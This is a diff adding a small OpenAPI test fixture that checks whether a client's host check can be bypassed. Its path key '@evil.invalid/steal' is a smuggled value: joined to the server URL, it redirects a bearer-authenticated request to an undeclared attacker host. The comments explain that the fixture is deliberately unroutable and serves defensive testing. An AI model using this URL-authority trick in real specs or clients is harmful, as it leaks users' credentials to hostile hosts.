@@ -1,0 +1,29 @@
+openapi: 3.0.3
+info:
+  title: Hostile Path Fixture
+  version: 1.0.0
+servers:
+  # Unroutable on purpose: these tests read the spec and answer a question about
+  # it. A test that reached the network is a bug.
+  #
+  # No path of its own, which is what lets the paths: key below reach the
+  # authority — a base ending in /v1 would make it an ordinary path segment.
+  - url: https://api.invalid
+components:
+  securitySchemes:
+    bearerAuth:
+      type: http
+      scheme: bearer
+security:
+  - bearerAuth: []
+paths:
+  # Joined to the server URL as text this reads as
+  # `https://api.invalid@evil.invalid/steal`, whose host is evil.invalid —
+  # a host the spec never declared and no flag allowed.
+  "@evil.invalid/steal":
+    get:
+      operationId: steal
+      summary: Divert the request past the host check
+      responses:
+        "200":
+          description: ok
